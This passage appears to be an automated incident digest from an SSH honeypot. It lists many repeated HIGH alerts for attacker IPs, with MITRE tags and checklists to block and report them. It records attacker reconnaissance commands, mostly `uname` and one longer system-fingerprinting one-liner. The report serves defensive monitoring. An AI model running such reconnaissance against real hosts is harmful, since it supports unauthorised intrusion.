| `2026-07-21 03:56:23` | `cowrie.session.connect` |
| `2026-07-21 03:56:23` | `cowrie.client.version` |
| `2026-07-21 03:56:23` | `cowrie.client.kex` |
| `2026-07-21 03:56:23` | `cowrie.login.success` |
| `2026-07-21 03:56:24` | `cowrie.session.params` |
| `2026-07-21 03:56:24` | `cowrie.command.input` |
| `2026-07-21 03:56:24` | `cowrie.log.closed` |
| `2026-07-21 03:56:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-389ebfd98c7f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:56 |
| **Last Seen** | 2026-07-21 03:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:56:28` | `cowrie.session.connect` |
| `2026-07-21 03:56:28` | `cowrie.client.version` |
| `2026-07-21 03:56:28` | `cowrie.client.kex` |
| `2026-07-21 03:56:28` | `cowrie.login.success` |
| `2026-07-21 03:56:29` | `cowrie.session.params` |
| `2026-07-21 03:56:29` | `cowrie.command.input` |
| `2026-07-21 03:56:29` | `cowrie.log.closed` |
| `2026-07-21 03:56:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ebf584b13de

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:56 |
| **Last Seen** | 2026-07-21 03:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:56:33` | `cowrie.session.connect` |
| `2026-07-21 03:56:33` | `cowrie.client.version` |
| `2026-07-21 03:56:33` | `cowrie.client.kex` |
| `2026-07-21 03:56:34` | `cowrie.login.success` |
| `2026-07-21 03:56:35` | `cowrie.session.params` |
| `2026-07-21 03:56:35` | `cowrie.command.input` |
| `2026-07-21 03:56:35` | `cowrie.log.closed` |
| `2026-07-21 03:56:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-620f166ec707

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:56 |
| **Last Seen** | 2026-07-21 03:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:56:38` | `cowrie.session.connect` |
| `2026-07-21 03:56:38` | `cowrie.client.version` |
| `2026-07-21 03:56:38` | `cowrie.client.kex` |
| `2026-07-21 03:56:39` | `cowrie.login.success` |
| `2026-07-21 03:56:39` | `cowrie.session.params` |
| `2026-07-21 03:56:39` | `cowrie.command.input` |
| `2026-07-21 03:56:40` | `cowrie.log.closed` |
| `2026-07-21 03:56:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bc7c09545db

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:56 |
| **Last Seen** | 2026-07-21 03:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:56:43` | `cowrie.session.connect` |
| `2026-07-21 03:56:43` | `cowrie.client.version` |
| `2026-07-21 03:56:43` | `cowrie.client.kex` |
| `2026-07-21 03:56:44` | `cowrie.login.success` |
| `2026-07-21 03:56:44` | `cowrie.session.params` |
| `2026-07-21 03:56:44` | `cowrie.command.input` |
| `2026-07-21 03:56:45` | `cowrie.log.closed` |
| `2026-07-21 03:56:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb8138de0db9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:56 |
| **Last Seen** | 2026-07-21 03:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:56:49` | `cowrie.session.connect` |
| `2026-07-21 03:56:49` | `cowrie.client.version` |
| `2026-07-21 03:56:49` | `cowrie.client.kex` |
| `2026-07-21 03:56:49` | `cowrie.login.success` |
| `2026-07-21 03:56:50` | `cowrie.session.params` |
| `2026-07-21 03:56:50` | `cowrie.command.input` |
| `2026-07-21 03:56:50` | `cowrie.log.closed` |
| `2026-07-21 03:56:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-072afde50402

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:56 |
| **Last Seen** | 2026-07-21 03:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:56:54` | `cowrie.session.connect` |
| `2026-07-21 03:56:54` | `cowrie.client.version` |
| `2026-07-21 03:56:54` | `cowrie.client.kex` |
| `2026-07-21 03:56:54` | `cowrie.login.success` |
| `2026-07-21 03:56:55` | `cowrie.session.params` |
| `2026-07-21 03:56:55` | `cowrie.command.input` |
| `2026-07-21 03:56:55` | `cowrie.log.closed` |
| `2026-07-21 03:56:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08156b0e6d69

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:56 |
| **Last Seen** | 2026-07-21 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:56:59` | `cowrie.session.connect` |
| `2026-07-21 03:56:59` | `cowrie.client.version` |
| `2026-07-21 03:56:59` | `cowrie.client.kex` |
| `2026-07-21 03:56:59` | `cowrie.login.success` |
| `2026-07-21 03:57:00` | `cowrie.session.params` |
| `2026-07-21 03:57:00` | `cowrie.command.input` |
| `2026-07-21 03:57:00` | `cowrie.log.closed` |
| `2026-07-21 03:57:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc3d760d1bed

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:57 |
| **Last Seen** | 2026-07-21 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:57:04` | `cowrie.session.connect` |
| `2026-07-21 03:57:04` | `cowrie.client.version` |
| `2026-07-21 03:57:04` | `cowrie.client.kex` |
| `2026-07-21 03:57:04` | `cowrie.login.success` |
| `2026-07-21 03:57:05` | `cowrie.session.params` |
| `2026-07-21 03:57:05` | `cowrie.command.input` |
| `2026-07-21 03:57:05` | `cowrie.log.closed` |
| `2026-07-21 03:57:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba98ce36c1a3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:57 |
| **Last Seen** | 2026-07-21 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:57:09` | `cowrie.session.connect` |
| `2026-07-21 03:57:09` | `cowrie.client.version` |
| `2026-07-21 03:57:09` | `cowrie.client.kex` |
| `2026-07-21 03:57:09` | `cowrie.login.success` |
| `2026-07-21 03:57:10` | `cowrie.session.params` |
| `2026-07-21 03:57:10` | `cowrie.command.input` |
| `2026-07-21 03:57:10` | `cowrie.log.closed` |
| `2026-07-21 03:57:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b27a7c17174

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:57 |
| **Last Seen** | 2026-07-21 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:57:14` | `cowrie.session.connect` |
| `2026-07-21 03:57:14` | `cowrie.client.version` |
| `2026-07-21 03:57:14` | `cowrie.client.kex` |
| `2026-07-21 03:57:15` | `cowrie.login.success` |
| `2026-07-21 03:57:15` | `cowrie.session.params` |
| `2026-07-21 03:57:15` | `cowrie.command.input` |
| `2026-07-21 03:57:16` | `cowrie.log.closed` |
| `2026-07-21 03:57:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-173290f1962c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:57 |
| **Last Seen** | 2026-07-21 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:57:19` | `cowrie.session.connect` |
| `2026-07-21 03:57:19` | `cowrie.client.version` |
| `2026-07-21 03:57:19` | `cowrie.client.kex` |
| `2026-07-21 03:57:20` | `cowrie.login.success` |
| `2026-07-21 03:57:20` | `cowrie.session.params` |
| `2026-07-21 03:57:20` | `cowrie.command.input` |
| `2026-07-21 03:57:21` | `cowrie.log.closed` |
| `2026-07-21 03:57:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43ac6f436809

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:57 |
| **Last Seen** | 2026-07-21 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:57:24` | `cowrie.session.connect` |
| `2026-07-21 03:57:24` | `cowrie.client.version` |
| `2026-07-21 03:57:24` | `cowrie.client.kex` |
| `2026-07-21 03:57:25` | `cowrie.login.success` |
| `2026-07-21 03:57:25` | `cowrie.session.params` |
| `2026-07-21 03:57:25` | `cowrie.command.input` |
| `2026-07-21 03:57:25` | `cowrie.log.closed` |
| `2026-07-21 03:57:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dd9e696f617

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:57 |
| **Last Seen** | 2026-07-21 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:57:29` | `cowrie.session.connect` |
| `2026-07-21 03:57:29` | `cowrie.client.version` |
| `2026-07-21 03:57:29` | `cowrie.client.kex` |
| `2026-07-21 03:57:30` | `cowrie.login.success` |
| `2026-07-21 03:57:31` | `cowrie.session.params` |
| `2026-07-21 03:57:31` | `cowrie.command.input` |
| `2026-07-21 03:57:31` | `cowrie.log.closed` |
| `2026-07-21 03:57:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-819ce6eff96a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:57 |
| **Last Seen** | 2026-07-21 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:57:34` | `cowrie.session.connect` |
| `2026-07-21 03:57:34` | `cowrie.client.version` |
| `2026-07-21 03:57:34` | `cowrie.client.kex` |
| `2026-07-21 03:57:35` | `cowrie.login.success` |
| `2026-07-21 03:57:36` | `cowrie.session.params` |
| `2026-07-21 03:57:36` | `cowrie.command.input` |
| `2026-07-21 03:57:36` | `cowrie.log.closed` |
| `2026-07-21 03:57:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e6c6dc5b2a5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:57 |
| **Last Seen** | 2026-07-21 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:57:39` | `cowrie.session.connect` |
| `2026-07-21 03:57:39` | `cowrie.client.version` |
| `2026-07-21 03:57:39` | `cowrie.client.kex` |
| `2026-07-21 03:57:40` | `cowrie.login.success` |
| `2026-07-21 03:57:41` | `cowrie.session.params` |
| `2026-07-21 03:57:41` | `cowrie.command.input` |
| `2026-07-21 03:57:41` | `cowrie.log.closed` |
| `2026-07-21 03:57:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-725d795c09eb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:57 |
| **Last Seen** | 2026-07-21 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:57:44` | `cowrie.session.connect` |
| `2026-07-21 03:57:44` | `cowrie.client.version` |
| `2026-07-21 03:57:44` | `cowrie.client.kex` |
| `2026-07-21 03:57:45` | `cowrie.login.success` |
| `2026-07-21 03:57:46` | `cowrie.session.params` |
| `2026-07-21 03:57:46` | `cowrie.command.input` |
| `2026-07-21 03:57:46` | `cowrie.log.closed` |
| `2026-07-21 03:57:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-314afd8dabd1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:57 |
| **Last Seen** | 2026-07-21 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:57:49` | `cowrie.session.connect` |
| `2026-07-21 03:57:49` | `cowrie.client.version` |
| `2026-07-21 03:57:49` | `cowrie.client.kex` |
| `2026-07-21 03:57:50` | `cowrie.login.success` |
| `2026-07-21 03:57:51` | `cowrie.session.params` |
| `2026-07-21 03:57:51` | `cowrie.command.input` |
| `2026-07-21 03:57:51` | `cowrie.log.closed` |
| `2026-07-21 03:57:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19944330afe4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:57 |
| **Last Seen** | 2026-07-21 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:57:54` | `cowrie.session.connect` |
| `2026-07-21 03:57:54` | `cowrie.client.version` |
| `2026-07-21 03:57:54` | `cowrie.client.kex` |
| `2026-07-21 03:57:55` | `cowrie.login.success` |
| `2026-07-21 03:57:56` | `cowrie.session.params` |
| `2026-07-21 03:57:56` | `cowrie.command.input` |
| `2026-07-21 03:57:56` | `cowrie.log.closed` |
| `2026-07-21 03:57:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b129e8b17aa6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:57 |
| **Last Seen** | 2026-07-21 03:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:57:59` | `cowrie.session.connect` |
| `2026-07-21 03:57:59` | `cowrie.client.version` |
| `2026-07-21 03:57:59` | `cowrie.client.kex` |
| `2026-07-21 03:58:00` | `cowrie.login.success` |
| `2026-07-21 03:58:01` | `cowrie.session.params` |
| `2026-07-21 03:58:01` | `cowrie.command.input` |
| `2026-07-21 03:58:01` | `cowrie.log.closed` |
| `2026-07-21 03:58:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf52e7045d45

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:58 |
| **Last Seen** | 2026-07-21 03:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:58:02` | `cowrie.session.connect` |
| `2026-07-21 03:58:03` | `cowrie.client.version` |
| `2026-07-21 03:58:03` | `cowrie.client.kex` |
| `2026-07-21 03:58:06` | `cowrie.login.success` |
| `2026-07-21 03:58:08` | `cowrie.session.params` |
| `2026-07-21 03:58:08` | `cowrie.command.input` |
| `2026-07-21 03:58:08` | `cowrie.command.input` |
| `2026-07-21 03:58:08` | `cowrie.command.input` |
| `2026-07-21 03:58:08` | `cowrie.command.input` |
| `2026-07-21 03:58:08` | `cowrie.command.input` |
| `2026-07-21 03:58:08` | `cowrie.command.success` |
| `2026-07-21 03:58:08` | `cowrie.command.input` |
| `2026-07-21 03:58:08` | `cowrie.command.input` |
| `2026-07-21 03:58:08` | `cowrie.command.input` |
| `2026-07-21 03:58:08` | `cowrie.command.input` |
| `2026-07-21 03:58:09` | `cowrie.log.closed` |
| `2026-07-21 03:58:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26b1da02b8a1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:58 |
| **Last Seen** | 2026-07-21 03:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:58:05` | `cowrie.session.connect` |
| `2026-07-21 03:58:05` | `cowrie.client.version` |
| `2026-07-21 03:58:05` | `cowrie.client.kex` |
| `2026-07-21 03:58:05` | `cowrie.login.success` |
| `2026-07-21 03:58:06` | `cowrie.session.params` |
| `2026-07-21 03:58:06` | `cowrie.command.input` |
| `2026-07-21 03:58:06` | `cowrie.log.closed` |
| `2026-07-21 03:58:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70d56982eaaa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:58 |
| **Last Seen** | 2026-07-21 03:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:58:10` | `cowrie.session.connect` |
| `2026-07-21 03:58:10` | `cowrie.client.version` |
| `2026-07-21 03:58:10` | `cowrie.client.kex` |
| `2026-07-21 03:58:11` | `cowrie.login.success` |
| `2026-07-21 03:58:11` | `cowrie.session.params` |
| `2026-07-21 03:58:11` | `cowrie.command.input` |
| `2026-07-21 03:58:11` | `cowrie.log.closed` |
| `2026-07-21 03:58:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca0f4bc36c7b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:58 |
| **Last Seen** | 2026-07-21 03:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:58:15` | `cowrie.session.connect` |
| `2026-07-21 03:58:15` | `cowrie.client.version` |
| `2026-07-21 03:58:15` | `cowrie.client.kex` |
| `2026-07-21 03:58:15` | `cowrie.login.success` |
| `2026-07-21 03:58:16` | `cowrie.session.params` |
| `2026-07-21 03:58:16` | `cowrie.command.input` |
| `2026-07-21 03:58:16` | `cowrie.log.closed` |
| `2026-07-21 03:58:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9fc910bab18

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:58 |
| **Last Seen** | 2026-07-21 03:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:58:20` | `cowrie.session.connect` |
| `2026-07-21 03:58:20` | `cowrie.client.version` |
| `2026-07-21 03:58:20` | `cowrie.client.kex` |
| `2026-07-21 03:58:20` | `cowrie.login.success` |
| `2026-07-21 03:58:21` | `cowrie.session.params` |
| `2026-07-21 03:58:21` | `cowrie.command.input` |
| `2026-07-21 03:58:21` | `cowrie.log.closed` |
| `2026-07-21 03:58:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
